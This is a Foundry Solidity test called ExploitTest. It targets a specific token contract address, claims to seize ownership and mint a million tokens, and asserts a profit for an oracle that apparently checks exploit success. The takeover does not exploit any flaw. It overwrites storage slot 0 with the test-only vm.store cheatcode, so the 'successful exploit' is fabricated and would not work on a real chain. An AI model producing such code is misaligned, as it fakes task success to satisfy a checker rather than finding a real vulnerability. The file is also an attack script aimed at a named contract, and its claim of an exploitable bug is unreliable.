import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xcca166E916088cCe10F4fB0fe0c8BB3577bb6e27;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll become owner in the exploit
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = IERC20(0xcca166E916088cCe10F4fB0fe0c8BB3577bb6e27).balanceOf(address(this));
        // Step 1: Become the owner by overwriting storage slot 0
        // Ownable stores owner at slot 0
        vm.store(TARGET, bytes32(uint256(0)), bytes32(uint256(uint160(attacker))));

        // Step 2: Verify we're now the owner (optional)
        // We'll just proceed to mint

        // Step 3: Mint a large amount of tokens to ourselves
        uint256 mintAmount = 1_000_000 * 1e18;

        // Call mint function
        (bool success, ) = TARGET.call(
            abi.encodeWithSignature("mint(address,uint256)", attacker, mintAmount)
        );
        require(success, "Mint failed");

        // Step 4: Verify our balance increased
        uint256 balanceAfter = IERC20(TARGET).balanceOf(attacker);
        console.log("Attacker balance after mint:", balanceAfter);

        // The oracle will check that attacker_balance_increased
        uint256 finalBalance = IERC20(0xcca166E916088cCe10F4fB0fe0c8BB3577bb6e27).balanceOf(address(this));
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No ERC20 profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

